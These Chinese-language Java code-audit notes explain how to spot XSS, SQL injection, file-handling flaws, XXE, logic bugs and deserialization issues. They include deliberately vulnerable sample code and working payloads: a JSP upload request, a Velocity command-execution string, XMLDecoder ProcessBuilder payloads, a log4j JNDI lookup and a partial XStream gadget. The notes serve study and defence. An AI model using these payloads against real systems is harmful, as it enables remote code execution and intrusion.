<a name="BU7HA"></a>
## 前言
其实java审计，最重要的还是要看漏洞代码，然后回溯漏洞的参数，看参数是否可控，中间的过程有没有被过滤。如果可控，没过滤，并且存在漏洞代码，就很有可能存在漏洞。

<a name="QSdp2"></a>
### 好文章
```java
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet xss生成payload
https://xz.aliyun.com/t/9173

https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925 知识盒子
http://wjlshare.com/archives/1529 天下大木头

https://mp.weixin.qq.com/s?__biz=Mzg5MjY2NTU4Mw==&mid=2247484982&idx=1&sn=b628f7c5f990ab78d9a90d592587b6e3&chksm=c03bedb6f74c64a0ff2349386a62bae111adf7efddd0aedbd33274de79592ca442a4ddc15404&scene=126&&sessionid=1643358793#rd

https://github.com/safe6Sec/CodeqlNote codeql文章
```

<a name="VORzU"></a>
## 代审技巧
有时候开发写的比较复杂，可以直接全局搜  RequestMapping 找到cotroller层路径，如果不是springboot框架，需要去看web.xml去定位路由<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1643298728190-49789cd0-ed50-4526-a298-bf682ae3b8d0.png#clientId=uf30af79f-4f46-4&from=paste&height=423&id=ufb161979&originHeight=845&originWidth=1775&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167257&status=done&style=none&taskId=ue1d6ca79-75a9-4dbb-907e-895c09db235&title=&width=887.5)
<a name="WcOUA"></a>
## 反射型XSS
关键词 :  getParamter、<%=、${}、print

jsp典型的反射xss<br /><%=request.getParameter("input")%><br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615903049846-532bdc2b-d175-4cfd-9e79-ed6e9ffac8a1.png#height=436&id=bRbQn&originHeight=581&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11509&status=done&style=none&title=&width=622)<br />一般都会在controller层中追踪参数，然后参数在前端没有过滤的输出，输出的方式很多时候是el表达式。<br />比如 string xss = request.getParameter("aufeng");<br /> request.setAttribute("aufeng",xss) //参数绑定的意思<br />然后前端是 ${xss}这样子的一个输出。

<a name="5rmFt"></a>
## 存储型XSS
存储型和反射型的差别在于是否存入数据库中<br />1、关键词:insert，save，update 中查找，然后全局搜索方法在哪里被调用。追踪到传参的位置，如果整个过程都没有过滤，就是存在。<br />2、从接受参数的关键词开始，比如说getParamter，跟踪请求参数，直到插入数据库的语句，如果中间没有过滤。那就是存在漏洞了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615907556261-70c06479-1973-406d-8589-960bd2167213.png#height=294&id=iGeqg&originHeight=391&originWidth=650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167074&status=done&style=none&title=&width=488)

修复方式：写一个xssfilter拦截器覆盖getParameter和getHeader方法，对传参进来的特殊符号进行强制转换

<a name="OSety"></a>
## SQL注入
关键词 : Select、Dao 、from 、delete 、update、insert、${

mybatis注入审计<br />[https://www.freebuf.com/vuls/240578.html](https://www.freebuf.com/vuls/240578.html)<br />先搜索xml查找可能存在注入的漏洞点-->反推到DAO-->再到实现类-->再通过调用链找到前台URL

修复：使用参数化查询语句避免将未经过滤的输入直接拼接到SQL查询语句中。对用户输入的特殊字符进行严格过滤，如and、or、select、union。
<a name="QL0lq"></a>
## 任意文件下载
delete、deleteFile、fileName 、filePath、File、read、write、copy<br />download

<a name="YpK7P"></a>
### 案例一：
fileName参数传入，没有经过任何过滤，攻击者可以构造../../../的方式进行跨目录下载任意文件<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627313992268-bbae1767-9f3a-46ab-8736-1ff6af417fc3.png#height=421&id=dgx9n&originHeight=842&originWidth=1110&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93190&status=done&style=none&title=&width=555)

<a name="Pd9Wm"></a>
### 案例二：
filePath参数可控，导致任意文件下载。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1645627480507-878e29b1-a191-48bb-af85-fc11c2312ecf.png#clientId=u919e7ee5-7473-4&from=paste&height=253&id=u127e3f95&originHeight=703&originWidth=1485&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100899&status=done&style=none&taskId=uf6f2a384-f919-4913-97c5-6a1d0350223&title=&width=535)

漏洞案例:参数name没经过滤，导致攻击者可以任意文件读取。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618386229374-6bba2e70-e20e-434d-a9d9-f35cf7147472.png#height=263&id=ehtZe&originHeight=350&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32995&status=done&style=none&title=&width=707)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618386344026-0b31a2d8-e2ba-49be-9ae3-0224568778d8.png#height=104&id=vuZCX&originHeight=139&originWidth=687&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13450&status=done&style=none&title=&width=515)

漏洞案例： 任意文件写入，并且路径可控<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618387464362-7f5c4979-d27e-4823-ade0-e28f15f36922.png#height=203&id=hgM9K&originHeight=271&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26133&status=done&style=none&title=&width=556)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618387510914-21e4bb12-eae4-446f-a124-599f623e9d2e.png#height=124&id=wEEJY&originHeight=165&originWidth=774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17793&status=done&style=none&title=&width=581)<br />漏洞案例：任意文件删除<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618387846083-275352ea-26be-46e4-bfde-2fef8cb8a948.png#height=108&id=FKGD1&originHeight=144&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14246&status=done&style=none&title=&width=547)
<a name="wHUxB"></a>
## 目录遍历
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618391095610-9a72cf88-91d4-424e-a954-212e18873560.png#height=187&id=TfecP&originHeight=250&originWidth=791&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19169&status=done&style=none&title=&width=593)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618391125211-145b87c6-25e0-47f0-a6b8-75b60787afe4.png#height=420&id=lwbVR&originHeight=560&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41641&status=done&style=none&title=&width=485)
<a name="CZx4M"></a>
## 文件上传漏洞

jsp文件上传 servlet逻辑处理代码 [https://blog.csdn.net/weixin_44741023/article/details/118933108](https://blog.csdn.net/weixin_44741023/article/details/118933108)

upload、write、fileName、filePath、fileUpload

获取文件名后缀的方式:<br /> 
```java
String ext = FilenameUtils.getExtension("abc.jpg");   
System.out.println(ext);
===========
输出结果为jpg
```

```java
String fileName = file.getOriginalFilename();
GetOriginalFilename() //获取文件上传时的名称
```

 <br />经典的文件上传漏洞代码<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618478875328-51235bd2-5b77-49e7-b9be-28d33057d370.png#height=407&id=oArxH&originHeight=543&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=158876&status=done&style=none&title=&width=640)


![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1641136617859-c464ea2a-2528-4674-a889-961efda441cb.png#clientId=ub275550c-7d5e-4&from=paste&height=288&id=uae9697d7&originHeight=492&originWidth=901&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45533&status=done&style=none&taskId=u5734924d-8c1b-4534-8f5b-d5d5e022ac6&title=&width=526.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1641136649683-fe3353d8-aca3-4d7a-947c-4aa1e6d45864.png#clientId=ub275550c-7d5e-4&from=paste&height=319&id=u6f816bdc&originHeight=637&originWidth=1522&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70958&status=done&style=none&taskId=ueee5ab73-6a3a-4548-8fad-05c43e752f6&title=&width=761)<br />代审的时候，可以直接构造html来进行文件上传
```java
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>单文件上传</title>
</head>
<body>
<form method="post" action="/upload" enctype="multipart/form-data">
    <input type="file" name="file"><br>
    <input type="submit" value="提交">
</form>
</body>
</html>
```

<a name="pHXjx"></a>
### 案例以及payload构造
漏洞代码
```java
/*     */   @RequestMapping({"insertData"})
/*     */   @ResponseBody
/*     */   public String insertData(HttpServletRequest request, HttpServletResponse respons, @RequestParam("file") MultipartFile file)
/*     */   {
/* 216 */     this.logger.info(Jurisdiction.getUsername() + "【上传文件】");
/* 217 */     Map<String, Object> returnmap = new HashMap();
/* 218 */     String dataName = request.getParameter("dataName");
/* 219 */     String type_no = request.getParameter("type_no");
/* 220 */     String version = request.getParameter("version");
/* 221 */     String create_id = UserUtil.getUserId();
/* 222 */     String inst_code = request.getParameter("inst_code");
/* 223 */     String inst_type = request.getParameter("inst_type");
/* 224 */     String data_type = request.getParameter("data_type");
/* 225 */     String docType = request.getParameter("docType");
/* 226 */     String create_time = DateUtils.getDate();
/* 227 */     PageData pd = new PageData();
/* 228 */     pd = getPageData();
/* 229 */     pd.put("type_no", type_no);
/* 230 */     pd.put("version", version);
/* 231 */     pd.put("create_id", create_id);
/* 232 */     pd.put("inst_code", inst_code);
/* 233 */     pd.put("inst_type", inst_type);
/* 234 */     pd.put("data_type", data_type);
/* 235 */     pd.put("docType", docType);
/* 236 */     pd.put("create_time", create_time);
/* 237 */     String filePath = null;
/* 238 */     String filename = null;
/*     */     
/* 240 */     String savePath = request.getSession().getServletContext().getRealPath("/uploadFiles/file");
/* 241 */     File targetFile = new File(savePath);
/*     */     
/* 243 */     if ((!targetFile.exists()) && (!targetFile.isDirectory())) {
/* 244 */       targetFile.mkdirs();
/*     */     }
/*     */     try {
/* 247 */       if (!file.isEmpty()) {
/* 248 */         int fileSize = (int)file.getSize() / 1024 / 1024;
/* 249 */         if (fileSize > 50) {
/* 250 */           throw new Exception("文件过大，上传失败");
/*     */         }
/*     */         
/* 253 */         String fileOriginalName = file.getOriginalFilename();
/* 254 */         if (fileOriginalName.contains("\\")) {
/* 255 */           fileOriginalName = fileOriginalName.substring(fileOriginalName.lastIndexOf("\\") + 1);
/*     */         }
/* 257 */         filePath = savePath + File.separator + ReportTool.formateDate(DateFormatUtils.format(new Date(), "yyyyMMdd")) + "_" + "version_" + version + "_" + fileOriginalName;
/*     */         
/* 259 */         filename = ReportTool.formateDate(DateFormatUtils.format(new Date(), "yyyyMMdd")) + "_" + "version_" + version + "_" + fileOriginalName;
/*     */         
/* 261 */         file.transferTo(new File(filePath));
/*     */         
/* 263 */         pd.put("dataName", dataName);
/* 264 */         pd.put("filePath", "uploadFiles/file/" + filename);
```
构造的上传包
```java
POST /crm/dataFile/insertData HTTP/1.1
Host: 10.0.17.56:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------108828876119442207182232566441
Content-Length: 289098
Origin: http://10.0.17.56:8080
Connection: close
Referer: http://10.0.17.56:8080/crm/dataFile/doAdd?inst_code=YH002105&inst_type=YH
Cookie: JSESSIONID=E87BE2853FFA30FD6E04B38A5023E6A4; loginname=crmtest

-----------------------------108828876119442207182232566441
Content-Disposition: form-data; name="inst_code"

YH002105
-----------------------------108828876119442207182232566441
Content-Disposition: form-data; name="inst_type"

YH
-----------------------------108828876119442207182232566441
Content-Disposition: form-data; name="dataName"

360
-----------------------------108828876119442207182232566441
Content-Disposition: form-data; name="type_no"

220224100318
-----------------------------108828876119442207182232566441
Content-Disposition: form-data; name="version"

123
-----------------------------108828876119442207182232566441
Content-Disposition: form-data; name="docType"

0
-----------------------------108828876119442207182232566441
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: image/x-icon


```
<a name="dZmhL"></a>
## 未授权漏洞
未授权漏洞讲究的主要是看过滤器。java web里边有很多过滤器，Filter、Interceptor、shiro框架。可以看过滤器里边的路径是否需要权限鉴定了才能进行访问，如果后台的路径没有被进行鉴定就可以访问的话，就存在未授权漏洞。其实思路也很简单。把controller层的路径抠出来，然后用bp去进行爆破就ok了。

存未授权漏洞的拦截器<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626878450966-1a91b7be-c358-43c5-977c-e103fd9a44d3.png#height=468&id=J788y&originHeight=624&originWidth=1238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=249193&status=done&style=none&title=&width=929)

可能存在漏洞的拦截器<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626878475571-437c39ee-eb4c-4488-a458-274fbef8ee8e.png#height=542&id=lzUVG&originHeight=723&originWidth=1143&originalType=binary&ratio=1&rotation=0&showTitle=false&size=277701&status=done&style=none&title=&width=857)

不可能存在漏洞的拦截器<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626878497561-35840286-13e4-4d4d-93f4-f1f7e92cb29e.png#height=437&id=FOIHs&originHeight=583&originWidth=1003&originalType=binary&ratio=1&rotation=0&showTitle=false&size=271747&status=done&style=none&title=&width=752)

interceptor过滤器<br />controller中设置session<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1641227109551-4d6697d5-ba19-4557-927d-465489f5d821.png#clientId=u982cb9c0-6948-4&from=paste&height=353&id=u34877b21&originHeight=705&originWidth=1275&originalType=binary&ratio=1&rotation=0&showTitle=false&size=671074&status=done&style=none&taskId=ue154db0b-c7c5-4391-92c2-27d8112cde9&title=&width=637.5)<br />设置session<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1641218556660-b4a95f2e-6b89-4ee6-8e2c-8c344c4c4862.png#clientId=u982cb9c0-6948-4&from=paste&height=320&id=uf2326e32&originHeight=542&originWidth=924&originalType=binary&ratio=1&rotation=0&showTitle=false&size=373004&status=done&style=none&taskId=u117df1e5-1688-4d69-bdff-660979503ea&title=&width=546)

设置url拦截器<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1641218647749-9c869420-93c5-4963-9401-a93ca253a941.png#clientId=u982cb9c0-6948-4&from=paste&height=244&id=u316d9578&originHeight=488&originWidth=1105&originalType=binary&ratio=1&rotation=0&showTitle=false&size=462543&status=done&style=none&taskId=uee861e7b-ab2e-45e6-9942-8f1912bcee2&title=&width=552.5)

<a name="VL8bT"></a>
### shiro的过滤链
shiroFilter<br />一般在spring-context.xml文件中<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1645841105652-d4cb7bc9-eb2b-4267-bca3-e2b625a66f29.png#clientId=uc6d07300-fd7b-4&from=paste&height=462&id=ucb06754d&originHeight=766&originWidth=723&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58236&status=done&style=none&taskId=u37327c10-1717-45b4-9fa8-d2c3c5f6bf6&title=&width=436.5)

<a name="AGL1K"></a>
## xxe代码审计
产生XXE有三个条件，首先是解析了XML，其次是XML外部可控。最后是没有禁用外部实体

快速定位 NodeList、DocumentHelper、DocumentBuilderFactory、Digester、SAXParserFactory、SAXBuilder、XMLReader

<a name="gk1Xi"></a>
### 漏洞代码：
XMLReader
```java
import org.xml.sax.helpers.XMLReaderFactory;
import org.xml.sax.XMLReader;
	
	漏洞代码：
    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

	修复代码：
        @RequestMapping(value = "/xmlReader/sec", method = RequestMethod.POST)
    public String xmlReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // fix code start
            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            //fix code end
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "xmlReader xxe security code";
    }
```

SAXBuilder
```java
    @RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return "SAXBuilder xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

SAXParserFactory
```java
    @RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return "SAXParser xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

Digester
```java
    @RequestMapping(value = "/Digester/vuln", method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "Digester xxe vuln code";
    }
```

DocumentBuilderFactory
```java
    @RequestMapping(value = "/DocumentBuilder/vuln01", method = RequestMethod.POST)
    public String DocumentBuilderVuln01(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i < rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j < child.getLength(); j++) {
                    Node node = child.item(j);
                    buf.append(String.format("%s: %s\n", node.getNodeName(), node.getTextContent()));
                }
            }
            sr.close();
            return buf.toString();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

```

DocumentHelper
```java
    /**
     * 修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；
     * 不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。
     */
    @PostMapping("/DocumentHelper/vuln")
    public String DocumentHelper(HttpServletRequest req) {
        try {
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "DocumentHelper xxe vuln code";
    }
```

NodeList
```java
    private static void response(NodeList rootNodeList){
        for (int i = 0; i < rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j < xxe.getLength(); j++) {
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info("xxeNode: " + xxeNode.getNodeValue());
            }

        }
    }
```
<a name="iLnEd"></a>
### 防护代码
```java
xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```
<a name="ffRYt"></a>
## 不安全的第三方插件
例如一个Strust2框架，用了漏洞组件，并且具备了CC链。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627314258516-6120531c-52e7-4ae6-9d2b-e4d961e7f81b.png#height=474&id=MRw0F&originHeight=632&originWidth=449&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134345&status=done&style=none&title=&width=337)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627314305854-69551a6b-90ab-4780-9e47-657d17393d7a.png#height=472&id=nQGP3&originHeight=629&originWidth=722&originalType=binary&ratio=1&rotation=0&showTitle=false&size=209419&status=done&style=none&title=&width=542)<br />搭建起来web后，直接命令执行。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627314324637-02f9a393-8417-4449-87b5-01943430f68a.png#height=693&id=ADjSd&originHeight=693&originWidth=949&originalType=binary&ratio=1&rotation=0&showTitle=false&size=479517&status=done&style=none&title=&width=949)
<a name="mPsxQ"></a>
## 逻辑漏洞
<a name="HBhKE"></a>
### 购物价格问题
商城系统的功能点，肯定会存在购物价格和数量的关系。如果价格为负数，那么购物者就可以盈利了。。。

如下代码 142行，price直接就相乘了。但是传入的两个参数，均没有校验是否为负数。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627311914909-65089516-e110-4d03-9ef7-ab3de39bbcbc.png#height=595&id=Z1rgm&originHeight=792&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60999&status=done&style=none&title=&width=524)<br />如果数量不少于0，就会建立订单。那么，前面没有校验价格，如果价格传入是-1，或者0，那么就免费购物了。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627312394590-7ff27ac3-f603-4a12-ab0e-22b3b2ec897d.png#height=569&id=jO3YY&originHeight=759&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56143&status=done&style=none&title=&width=465)
<a name="Oo36A"></a>
### 数据覆盖
注册功能处，注册用户时，服务器后端仅对前端传入的数据进行了验证码校验，未判断当前注册所使用的用户名是否存在于数据库中，如果验证码正确，则执行向数据库中覆盖旧用户的数据。

save方法中是注册的功能点，传入了很多参数。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627313048934-8464c68b-2bf0-43bc-852f-641d0ee1132b.png#height=411&id=dbq94&originHeight=822&originWidth=1016&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69533&status=done&style=none&title=&width=508)<br />该程序仅仅对验证码进行判断，就进入了下一个环节。把数据存入数据库，如果user值是相同的，那么很有可能覆盖掉旧的数据。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627313141988-d5616cea-9477-4f7c-aa58-d432bc1ce3c0.png#height=900&id=ExWPy&originHeight=900&originWidth=1578&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101452&status=done&style=none&title=&width=1578)

<a name="z07zx"></a>
## 模板注入

#set如下类型就是模板注入，这个是velocity类型的模板注入
```java
GET /nbfund/velocity?velocity_param=#set($c=12635136+1748856)${c}$c HTTP/1.1
Accept-Encoding: gzip, deflate
Host: 199.118.128.32:8089
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.0.0; PRA-AL00X Build/HONORPRA-AL00X)
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 0
```
命令执行回显payload，用的时候要url编码一下
```java
/nbfund/velocity?velocity_param=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667746551655-0dea28f7-7751-40fe-a38b-a0542dd33d70.png#clientId=ue5add110-50ef-4&from=paste&height=174&id=ud517f467&originHeight=217&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=232394&status=done&style=none&taskId=ueb313fd0-4ae2-4444-b2f6-f44be793454&title=&width=965.6)

<a name="NI4pW"></a>
## 反序列化漏洞
readObject()、InputStream、<br />readObject、readUnshared、load、fromXML、readValue<br />JSON.parseObject

如下图所示路径，cookie可控，可以构造base64加密的序列化传参，会触发readObject反序列化解密<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1643357044326-c2cab6a7-a4ab-4751-ac53-0ae4976de493.png#clientId=uedda24e0-cda9-4&from=paste&height=339&id=ub0010a42&originHeight=515&originWidth=780&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41613&status=done&style=none&taskId=ub3a8e03f-141d-4317-8b2e-103a0487e55&title=&width=513)



<a name="NgOQK"></a>
### XMLDecoder
  xml反序列化漏洞代码<br />快速定位 XMLDecoder
```java
@RestController
public class XmlDecoderRCE {
    @PostMapping("/XmlDecoder")
    public String parseXml(HttpServletRequest request) throws Exception{
        InputStream in = request.getInputStream();
        XMLDecoder d = new XMLDecoder(in);
        Object result = d.readObject(); //Deserialization happen here
        return "xstream";
    }
}
```

攻击payload
```java
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_131" class="java.beans.XMLDecoder">
	<object class="java.lang.ProcessBuilder">
		<array class="java.lang.String" length="1">
			<void index="0">
				<string>calc</string>
			</void>
		</array>
		<void method="start" />
	</object>
</java>

或者

<void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
        <void index="0">
            <string>cmd.exe</string>
        </void>
        <void index="1">
            <string>/c</string>
        </void>
        <void index="2">
            <string>calc</string>
        </void>
    </array>
    <void method="start"/>
</void>
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644470617593-d379fd7c-2b71-4ad7-8566-65209a29b745.png#clientId=u77d7230b-243d-4&from=paste&height=412&id=uee5b10f7&originHeight=824&originWidth=1857&originalType=binary&ratio=1&rotation=0&showTitle=false&size=363956&status=done&style=none&taskId=u35fbf277-4f7c-4fec-89fb-f9f192a27d9&title=&width=928.5)
<a name="yq7Oi"></a>
### fastjson
params可控，jar包依赖符合漏洞范围，直接fastjson反序列化漏洞<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1645672896602-8269ca52-4261-490d-913b-0b95aaab5831.png#clientId=u7486b0bd-22e0-4&from=paste&height=205&id=u5ae659af&originHeight=410&originWidth=1367&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55573&status=done&style=none&taskId=ub66c143b-a408-48b2-b309-d2f620f90dd&title=&width=683.5)
<a name="wepRA"></a>
### jndi注入

InitialContext()、lookup()、<br />如果uri可控，就可以进行jndi注入<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1643533073140-f6540d42-2a7f-411d-8de2-1bc8e24289b7.png#clientId=uee333f2b-90e6-4&from=paste&height=268&id=u3f60a253&originHeight=332&originWidth=659&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18920&status=done&style=none&taskId=u86f1a4b2-d46f-4581-bbeb-a7b40a6a99b&title=&width=531.5)
```java
Context ctx = new InitialContext();

// 获取RMI绑定的恶意ReferenceWrapper对象
Object obj = ctx.lookup("注入JNDI服务URL");
```
<a name="VR7PZ"></a>
### log4j2

1、没有使用log4j2，但是间接引入log4j-api 和 log4j-core 2.x，也存在漏洞<br />2、只有log4j-api 2.x，没有log4j-core 2.x，不用升级，但需要确认编译的包里没有log4j-core 2.x 不仅是在pom里确认

快速定位 ：getLogger

漏洞代码demo：
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

public class Log4j {
    public static final Logger LOGGER = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) {
        ThreadContext.put("loginId", "${${ctx:loginId}}");
        LOGGER.error("a");
    }
}

```
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import sun.applet.Main;

public class log4j {
    private static Logger LOG=LogManager.getLogger(Main.class);
    public static void main(String[] args) {
        LOG.error("${jndi:ldap://localhost:9999/Exploit}");
    }
}
```
真实案例代码如下所示：<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1646150669400-2aeca39c-b6e2-4f98-81aa-86a9f1b12f9c.png#clientId=ub5add994-af4b-4&from=paste&height=284&id=u521d4d6a&originHeight=567&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68087&status=done&style=none&taskId=u95e736e3-5fbf-40cb-b4ed-e76ccd2a0b9&title=&width=632.5)

<a name="U20ZN"></a>
### xtream
快速定位 fromXML
```java
public class Main {

    public static void main(String[] args) {
        String xml ="<sun.rmi.registry.RegistryImpl_Stub serialization=\"custom\"> \n" +
                "  <java.rmi.server.RemoteObject> \n" +
                "    <string>UnicastRef</string>  \n" +
                "    <string>127.0.0.1</string>  \n" +
                "    <int>8001</int>  \n" +
                "    <long>0</long>  \n" +
                "    <int>0</int>  \n" +
                "    <long>0</long>  \n" +
                "    <short>0</short>  \n" +
                "    <boolean>false</boolean> \n" +
                "  </java.rmi.server.RemoteObject> \n" +
                "</sun.rmi.registry.RegistryImpl_Stub>";
        // write your code hereXStream xstream = new XStream();;
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
```
payload

- <=1.4.6
- =1.4.10
```java
<tree-map>
    <entry>
        <string>fookey</string>
        <string>foovalue</string>
    </entry>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
